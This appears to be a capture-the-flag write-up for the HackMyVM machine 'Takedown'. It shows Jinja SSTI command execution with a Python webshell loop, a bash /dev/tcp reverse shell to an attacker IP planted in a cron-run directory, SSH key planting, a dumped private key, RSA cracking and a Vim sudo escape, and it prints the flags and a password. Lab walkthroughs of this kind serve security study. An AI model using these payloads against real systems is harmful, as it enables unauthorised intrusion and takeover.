# Takedown

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.30:22
Open 10.0.2.30:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.30

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey: 
|   3072 51:fb:66:e0:d2:b6:ae:16:a9:d2:74:41:a5:b3:02:2b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNrGurGrC51vPjC249Gl7CRJKtMSbGlxybwXrM/S5/OMVUAukNmyAEmlbu9tRLV5zNV3YId6j2whVyaD14/mad8E1FpmZvY0NHByW4mhINl1vkAP1ugvxIgSHOGq+lqm0m9KP8rIO6QNJt4+0DwnhBcc5qntmgueyjqBm4w/JKK3MIfPeVwO/eLOtxfARrKgBp8yYMWQ1uE7y9UBTxdO7zJ4Qmw7VLUbb9ul+b28V/M6h9yvnbiPaZ+WfOXQXBmeLP509J9rIrJxUGLelQs5HYe7kPSDRGsdVD8wzvlIkSJvvLkm6MHkN1qIXYOQXxlxX7c2Sm60aFvG5KJBOYceWeYovB6xeTZfNjl3qCFHF6nEwHIw8xjESwmykyn4fb27uR9w8SL64OBtiOBFf8TLNfM9Avt4kGPHObgd/2eR2xuwiv6DTPwBNx8ThWt9QPjXh2BVc4ea3PoD5Ua6wKm3daj0ap+16hJI55miOu+1Stw4UVvhB3ErURRXabaUP4tH0=
|   256 93:a0:01:6c:42:cd:26:bf:38:e5:70:fb:b8:c6:b3:fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH9YPJJZMdKeUU0dnv7cwV1/NXw1vpInx/uKPqxdqPPPt8/h0QuioHCGa5jQ8NRhUjCC72N0301UXY8ZpofgCus=
|   256 77:c9:ed:41:a5:cb:30:33:08:22:88:f6:a8:28:11:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGGTQ9jwxYWbq1vbX8qge/QWDNqhrS7smDmpPaIRBZxG
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://shieldweb.che/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

The machine has a valid DNS record

![writeup.png](/assets/pentest/hackmyvm/takedown/writeup.png)

There's a contact form on `ticket` subdomain

![writeup-1.png](/assets/pentest/hackmyvm/takedown/writeup-1.png)

### SSTI

While testing for few things I tried SSTI payload and it triggered 

![writeup-2.png](/assets/pentest/hackmyvm/takedown/writeup-2.png)

[https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)

```bash
â””â”€$ curl 'http://ticket.shieldweb.che/submit' -d 'email=let@me.in&message=uwu' --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('id').read() }}" -s | html2markdown
...
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Unfortunately the app is Docker container and doesn't have ability to make outbound connections, so no reverse shell but webshell.
```python
from requests import Session
from bs4 import BeautifulSoup as BS
import re
import readline

URL = 'http://ticket.shieldweb.che/submit'

with Session() as session:
    while True:
        cmd = '{{ cycler.__init__.__globals__.os.popen("%s 2>&1").read() }}' % input('Command: ')
        resp = session.post(URL, data={'email': 'let@me.in', 'message': 'uwu', 'name': cmd})
        output_html = BS(resp.text, 'html.parser').find('div', {'class': 'response'}).text
        output = re.search(r'message,(.*)!', output_html, re.DOTALL).group(1)
        print(output.strip())
        print('- ' * 16)
```

Nothing in `/opt`, no `docker.sock`, no envs, there's a custom directory called `script` but it's empty too, no passwords to crack in `/etc/shadow`, nothing in `/etc/hosts`, no cronjobs....
```bash
Command: ls -Ahl /
total 60K
-rwxr-xr-x    1 root     root           0 Jun 23 14:56 .dockerenv
drwxr-xr-x    3 root     root        4.0K Sep  1  2023 app
drwxr-xr-x    2 root     root        4.0K Apr 14  2021 bin
drwxr-xr-x    5 root     root         340 Aug 31 17:08 dev
drwxr-xr-x   17 root     root        4.0K Jun 25 09:48 etc
drwxr-xr-x    2 root     root        4.0K Apr 14  2021 home
drwxr-xr-x    5 root     root        4.0K Jun 25 09:48 lib
drwxr-xr-x    5 root     root        4.0K Apr 14  2021 media
drwxr-xr-x    2 root     root        4.0K Apr 14  2021 mnt
drwxr-xr-x    2 root     root        4.0K Apr 14  2021 opt
dr-xr-xr-x  145 nobody   nobody         0 Aug 31 17:08 proc
drwx------    2 root     root        4.0K Jun 28 17:17 root
drwxr-xr-x    2 root     root        4.0K Apr 14  2021 run
drwxr-xr-x    2 root     root        4.0K Apr 14  2021 sbin
drwxr-xr-x    2 root     root          40 Aug 31 17:08 script
drwxr-xr-x    2 root     root        4.0K Apr 14  2021 srv
dr-xr-xr-x   13 nobody   nobody         0 Aug 31 17:08 sys
drwxrwxrwt    2 root     root        4.0K Jun 28 13:41 tmp
drwxr-xr-x    8 root     root        4.0K Jun 25 09:48 usr
drwxr-xr-x   11 root     root        4.0K Jun 25 09:48 var
```

While looking over the files I noticed `/var/log` is unusually empty and has custom files
```bash
Command: ls /var/log -alhR
/var/log:
total 16K
drwxr-xr-x    2 root     root        4.0K Jun 23 15:30 .
drwxr-xr-x   11 root     root        4.0K Jun 25 09:48 ..
-rw-r--r--    1 root     root         980 Jun 23 15:29 access.yml
-rw-r--r--    1 root     root         123 Jun 23 15:29 chat
- - - - - - - - - - - - - - - -
Command: cat /var/log/chat
Kevin: Love be careful what you do.
A.love: I don't know Kevin, it's just a moment.
Kevin: Remove that now.
A.Love: Go to.
- - - - - - - - - - - - - - - -
Command: cat /var/log/access.yml
2023-08-31 10:15:42 - User: jsmith - Action: Login successful
2023-08-31 11:20:18 - User: a_doe - Action: Access to folder /data/confidential
2023-08-31 12:45:29 - User: s_miller - Action: Unauthorized access attempt
2023-08-31 14:30:05 - User: jdoe - Action: Create file new_report.txt
2023-08-31 15:10:22 - User: r_jones - Action: Logout

2023-08-31 16:55:11 - User: l_smith - Action: Edit file quarterly_report.docx
2023-08-31 18:02:45 - User: jbrown - Action: Accidental deletion of important file.pdf
2023-08-31 19:40:30 - User: c_wilson - Action: Copying files to shared folder /data/public
2023-08-31 20:15:17 - User: m_johnson - Action: Password change successful
2023-08-31 21:30:59 - User: k_adams - Action: Download confidential_backup.zip file

2023-08-31 22:45:00 - User: A.love - Action: Cron job executed: */5 * * * * root bash /home/love/script/*
```

If we had to guess the `script` directories might be bridged from Host to Docker, we can drop the file and wait some time
```bash
Command: echo $'#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1' > /script/letmein.sh
Command: chmod 777 /script/letmein.sh
```

After about 5 minutes we get a shell
```bash
â””â”€$ pwncat-cs -lp 4444
[13:25:28] Welcome to pwncat ðŸˆ!                                                          __main__.py:164
[14:05:02] received connection from 10.0.2.30:45154                                            bind.py:84
[14:05:02] 0.0.0.0:4444: normalizing shell path                                            manager.py:957
           10.0.2.30:45154: registered new host w/ db                                      manager.py:957
(local) pwncat$
(remote) love@osiris:/home/love$ id
uid=1002(love) gid=1002(love) grupos=1002(love)
```

## SSH 

Upgrade reverse shell to SSH
```bash
â””â”€$ ssh-keygen -f id_rsa -q -P x
â””â”€$ cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrLBv5pioAZOgEKPneU/c59DN1QOdunCy3zTQl4FbF4 woyag@kraken
---
(remote) love@osiris:/home/love$ mkdir .ssh
(remote) love@osiris:/home/love$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrLBv5pioAZOgEKPneU/c59DN1QOdunCy3zTQl4FbF4 woyag@kraken' > .ssh/authorized_keys
---
â””â”€$ ssh love@shieldweb.che -i id_rsa
love@osiris:~$ id
uid=1002(love) gid=1002(love) grupos=1002(love)
```

```bash
love@osiris:~$ sudo -l
Matching Defaults entries for love on osiris:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User love may run the following commands on osiris:
    (mitnick) NOPASSWD: /home/mitnick/sas
love@osiris:~$ cat note.txt
A.love:

Kevin this is a good icebreaker

we have icebreaker

jajajajjaja

S.A.S.
```

## Privilege Escalation (mitnick)

```bash
love@osiris:~$ sudo -u mitnick /home/mitnick/sas
  SSSSS            AAA             SSSSS
 S     S          A   A           S     S
 S               A     A          S
  SSSSS          A     A           SSSSS
       S   ###   AAAAAAA    ###         S
 S     S   ###   A     A    ###   S     S
  SSSSS          A     A           SSSSS
SAS v1.0
(c) SWITCHED ACCESS SERVICES 2023 Aquilino Morcillo

sas -h Available commands
# sas -h
Available commands:
sas_call - listen to Services
ls - List files and directories
cat <filename> - Display contents of a file
whoami - Show current user
sas help (-h) - Show available commands
version (-v) - Show application version
run <filename> - Execute a file
dir - Show the content of the current directory in wide format
# cat /home/mitnick/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEApkpLrAJNTo+WDTlA1ncbpyYAg9iPR/UT80pW350PuMMQgn4uF59L
3+mr8fbQzXwU5R+gtgoL5M7dn84cgt273/Tjdar9xBsaficyjyXpiQlqTDtjx7tAloKtaf
D0siJcH9oZLhS9OA2rCQvQ7M3YR8XLyXy2l4Vc76X1sBG97uRSCVqua6QHGQoTSrz8vfA2
xbN36N88zqRYzAwhclUKGYzYzHfqWgD7qShjvn2A84D44d8eDOqGswEwoZVraHtCAFQhtm
BoyfXsYRvwdGZZQ5eClgqFDlpCprCbz4yBZXRpygpztvxTgh+TxqaCLq8cAwEWLPKD8qgU
X6QmLrbbMmQivz7quUkJMat64i3ea3zcBybGE3Bhw3NXtOZt8Z/0hJ0z0iFdGT7XYTMm+N
F8M+qQp6Mh0KCZME5mfeOeNuOU4sx44JlB1lTsfn6LNbaaHukwLbDFeMpLeAHlLt0SXaTz
6yaMiSAqikq2ZGtEhmvRirAwnjx/vbpQYmjf+eyFAAAFiNHnEW/R5xFvAAAAB3NzaC1yc2
EAAAGBAKZKS6wCTU6Plg05QNZ3G6cmAIPYj0f1E/NKVt+dD7jDEIJ+LhefS9/pq/H20M18
FOUfoLYKC+TO3Z/OHILdu9/043Wq/cQbGn4nMo8l6YkJakw7Y8e7QJaCrWnw9LIiXB/aGS
4UvTgNqwkL0OzN2EfFy8l8tpeFXO+l9bARve7kUglarmukBxkKE0q8/L3wNsWzd+jfPM6k
WMwMIXJVChmM2Mx36loA+6koY759gPOA+OHfHgzqhrMBMKGVa2h7QgBUIbZgaMn17GEb8H
RmWUOXgpYKhQ5aQqawm8+MgWV0acoKc7b8U4Ifk8amgi6vHAMBFizyg/KoFF+kJi622zJk
Ir8+6rlJCTGreuIt3mt83AcmxhNwYcNzV7TmbfGf9ISdM9IhXRk+12EzJvjRfDPqkKejId
CgmTBOZn3jnjbjlOLMeOCZQdZU7H5+izW2mh7pMC2wxXjKS3gB5S7dEl2k8+smjIkgKopK
tmRrRIZr0YqwMJ48f726UGJo3/nshQAAAAMBAAEAAAGBAJEtS+NgHx33PYlN8s1KL1o+Uz
TIXE72J/S/chjHhnJH2qIShysYZ6WU3Aji8mhza8qdUjGbk8au084wo7Oc4ekkY3DXV7Vd
9EMu9XUEJF7/WU40i2hUko7Uh5F2TCs41DT6tAEHGitVw3yiVERpcek3RjMiLkcap4iR22
1cD/YAX57LDHvtOEUkBrO5Su6ISUlQ5d7pBq1hziRWctzeYXLtBFl+V5s8QHnuSSaFa48r
ih2oLRQZrH+bCloHmT4eXJfbKaUdYJz3J6JgUFwC5dey+ZPgoqDo06kRlRt/AfNEb0hRln
EfFgwlB4n59W48r7vTa8IXhrHvw+2atz1YPrC75JK47VPn68aWRE9gGxjYUD1m2C+RPkPb
F5uc5ksDk3fMvWNxt0IrQAvEH5RcZowtYuijchw88PVIhfk+qqiD/m5x8L2Ums8gYZG1Wz
fzEwRuZJLvL3tKmoMpiA7+WfZg/VngcGqGBZ9rIbb1Y0K/L1AMIC34SYp4hQtanWgaAQAA
AMBaCXAiSrD48Cset0rwBvthTCs+U+62qhiiRqs0Lj3TwhAbl8SS7/uvFQW/gfYgcoqJyg
u5Aa1+LsFjaCVD+DdfBukfhlr3wG50uokbgGH4yMK04JVeHIS8fGWm4F6Bie2JYQdWCUuC
r2trD61/k7KscJWrrtbm+LXJIE1YqWAYSbf2J0HtLRt6/xc3IticO7uH4kvnEGwNDuS39O
YFvaIcLDuJLpKxwg27Kj2kFIup1xWxXfQjHGI2zBVN/LuznX4AAADBANyWmNcv16JHjiAL
N4Ulv0Ti93jwCv37iyZremeVpsTHGaKarUs7s+wjSyXJCbYNGCgir/zJMDI6dhpFr/4/OH
JsXNYNIHGtp5Z8Lwe+ubaQh93UOqrV83M1cPaKNCY39UYcih62N6QCLggMUHf1TSYqidlE
PPFai27u1orAMRoXzfgdz+gkIGxNvWhruXLQ+h8SP33vYLz290XM0d9p0Oq/rTdHZzgESO
gln0BsBoFjVg848Xgvhn6C9vbKamfAiwAAAMEAwPw9RfWNdS0zwnYmn9ilnc6GNwtXsdJ0
ag3fV9amkp37Vhu8Yuwd9e+YmNcsaF9ya7/eXD7DrG0XRF9xNrKkbYW1hfv0mkSeGuOmdX
mMZfIoid0LBaA9QKpOcfSOqbcuOhAsoplqhfo3tMQjbEK4m7E2PgUlTZh26KIEfNqIJAhP
SBp5y8MyJi8ON8K5ypCHaTYcx28zASZGGmwBTbQTHCcxP8PlaTSUJoImc3/76D5hEdJgra
w5YLXZHeAjYBkvAAAADm1pdG5pY2tAb3NpcmlzAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

For some reason Private Key was not enough to login into SSH
```bash
â””â”€$ nano id_rsa.mitnick
â””â”€$ chmod 600 id_rsa.mitnick
â””â”€$ ssh mitnick@shieldweb.che -i id_rsa.mitnick
Warning: Permanently added 'shieldweb.che' (ED25519) to the list of known hosts.
mitnick@shieldweb.che's password:
```

We can `run` script, so let's get a second reverse shell
```bash
love@osiris:~$ cat /tmp/letmein.sh
#!/bin/bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrLBv5pioAZOgEKPneU/c59DN1QOdunCy3zTQl4FbF4 woyag@kraken' >> /home/mitnick/.ssh/authorized_keys
---
# run /tmp/letmein.sh
```

```bash
â””â”€$ ssh mitnick@shieldweb.che -i id_rsa
mitnick@osiris:~$ id
uid=1003(mitnick) gid=1003(mitnick) grupos=1003(mitnick)
```

### User.txt

```bash
tomu@osiris:~$ cat user.txt
612701a03669485d94bc687449fdab39
```

## Privilege Escalation (tomu)

```bash
mitnick@osiris:~$ find . -type f -ls
   130707      4 -rw-r--r--   1 mitnick  mitnick        32 ago 31  2023 ./secret.enc
   136616      4 -rw-------   1 mitnick  mitnick      2602 sep  1  2023 ./.ssh/id_rsa
   135032      4 -rw-r--r--   1 mitnick  mitnick        94 ago 31 20:52 ./.ssh/authorized_keys
   136617      4 -rw-r--r--   1 mitnick  mitnick       568 sep  1  2023 ./.ssh/id_rsa.pub
   136596      4 -rw-r--r--   1 mitnick  mitnick       807 ago 31  2023 ./.profile
   136597      4 -rw-r--r--   1 mitnick  mitnick       220 ago 31  2023 ./.bash_logout
   136601      4 -rw-r--r--   1 mitnick  mitnick       138 ago 31  2023 ./publickey.pub
   136598      4 -rw-r--r--   1 mitnick  mitnick      3526 ago 31  2023 ./.bashrc
   130787   2432 -rwx-----x   1 mitnick  mitnick   2486396 ago 31  2023 ./sas
```

The next step seems to decode `secret.enc` and the easiest way to go about this is [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool)
```bash
â””â”€$ scp -i id_rsa mitnick@shieldweb.che:publickey.pub .
â””â”€$ scp -i id_rsa mitnick@shieldweb.che:secret.enc .

â””â”€$ pipx install git+https://github.com/RsaCtfTool/RsaCtfTool
â””â”€$ RsaCtfTool --publickey publickey.pub --decryptfile secret.enc --private
['publickey.pub']

[*] Testing key publickey.pub.
attack initialized...
attack initialized...
[*] Performing lucas_gcd attack on publickey.pub.
100%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 9999/9999 [00:00<00:00, 59351.34it/s]
[+] Time elapsed: 0.1940 sec.
[*] Performing mersenne_primes attack on publickey.pub.
 24%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                                                                                                                                  | 12/51 [00:00<00:00, 99864.38it/s]
[+] Time elapsed: 0.0026 sec.
[*] Performing smallq attack on publickey.pub.
[+] Time elapsed: 1.3327 sec.
[*] Performing rapid7primes attack on publickey.pub.
[+] Time elapsed: 0.0016 sec.
[*] Performing nonRSA attack on publickey.pub.
[+] Time elapsed: 0.0035 sec.
[*] Performing factordb attack on publickey.pub.
[*] Attack success with factordb method !
[+] Total time elapsed min,max,avg: 0.0016/1.3327/0.3069 sec.

Results for publickey.pub:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIGrAgEAAiEAyi/6FvQs4lbjPrDTdO/zI2zBgNeQQyMMkTjqNAfewRECAwEAAQIh
AK3yTsf2tLLZq9IgkRv24AbdmxAYvRgmyA/I66tUb+SRAhEAzTtP7imRDzra1nQc
iVoevQIRAPwz4UPuS1/rYZM0Z6+TauUCEEApf+a8dg5l3w7WxCko1J0CEQDNdEIm
AeF7kZhawE1bdh+VAhA2aIpbJ2l3E4AlMpOlMIo6
-----END RSA PRIVATE KEY-----

Decrypted data :
HEX : 0x00028f787e04dc3b19bd991096007368316d306d757234426c34636b6834740a
INT (big endian) : 4523892322096029502969309045562347898126194069418172016349612551756346378
INT (little endian) : 4728444451300668645606335805883900677278207285285179913720669619982840037888
utf-16 : È€ç¢Ñ¾ã¯œë´™á‚™Â–æ¡³æ´±æ´°ç‰µäˆ´ã‘¬æ­£ã‘¨à©´
STR : b'\x00\x02\x8fx~\x04\xdc;\x19\xbd\x99\x10\x96\x00sh1m0mur4Bl4ckh4t\n'

PKCS#1.5 padding decoded!
HEX : 0x007368316d306d757234426c34636b6834740a
INT (big endian) : 10053367947426584884235739064106398956942346
INT (little endian) : 233130310633769746240573085161825967043801856
utf-8 : sh1m0mur4Bl4ckh4t

STR : b'\x00sh1m0mur4Bl4ckh4t\n'
```

```bash
mitnick@osiris:~$ su - tomu
Password: sh1m0mur4Bl4ckh4t
tomu@osiris:~$ id
uid=1001(tomu) gid=1001(tomu) grupos=1001(tomu)
```

::: tip Creds
`tomu:sh1m0mur4Bl4ckh4t`
:::

## Privilege Escalation (root)

```bash
tomu@osiris:~$ sudo -l
[sudo] password for tomu:
Matching Defaults entries for tomu on osiris:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tomu may run the following commands on osiris:
    (root) /opt/Contempt/Contempt

tomu@osiris:~$ sudo /opt/Contempt/Contempt
```

![writeup-3.png](/assets/pentest/hackmyvm/takedown/writeup-3.png)

![writeup-4.png](/assets/pentest/hackmyvm/takedown/writeup-4.png)

We enter `tomu`'s password and get a shell

```bash
These are the available commands:
- RCE: Remote Command Execution
- exploit: Execute an exploit to intrude on the server
- worm: Deploy a worm to infect the server
# ...
```

Garbage, it just displays ASCII art with some hacky delays...

If we go back and use `[2] Help` we enter Vim -> [https://gtfobins.github.io/gtfobins/vim](https://gtfobins.github.io/gtfobins/vim)

![writeup-5.png](/assets/pentest/hackmyvm/takedown/writeup-5.png)

```bash
# Type -> :!/bin/bash
root@osiris:/home/tomu# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Root.txt

```bash
root@osiris:~# /root/root.sh
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â•      â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—
â•šâ•â•     â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•    â•šâ•â•     â•šâ•â•â•šâ•â•   â•šâ•â•   â•šâ•â•  â•šâ•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•  â•šâ•â•

flag --> 1e271c5ce97e76ae8417a95c74085fba
```